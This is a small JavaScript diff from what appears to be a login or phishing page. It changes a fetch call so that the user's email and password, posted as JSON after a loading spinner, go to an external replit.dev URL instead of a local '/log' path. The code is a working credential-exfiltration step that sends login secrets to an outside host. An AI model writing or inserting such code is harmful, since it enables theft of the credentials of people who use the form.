@@ -140,7 +140,7 @@
       didOpen: () => Swal.showLoading()
     });
 
-    fetch("/log", {
+    fetch("https://a8526f24-0f26-4acb-a068-88cc3ec75e2e-00-czjlcjdbl56f.picard.replit.dev/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, password })
